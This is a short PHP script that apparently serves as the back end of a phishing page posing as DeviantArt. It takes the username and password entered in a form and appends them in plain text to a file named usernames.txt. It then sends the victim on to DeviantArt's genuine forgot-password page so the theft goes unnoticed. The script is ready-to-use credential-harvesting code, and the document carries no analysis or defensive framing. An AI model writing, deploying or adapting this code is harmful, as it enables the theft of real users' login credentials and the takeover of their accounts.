<?php

file_put_contents("usernames.txt", "Deviantart Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.deviantart.com/users/forgot/');
exit();
?>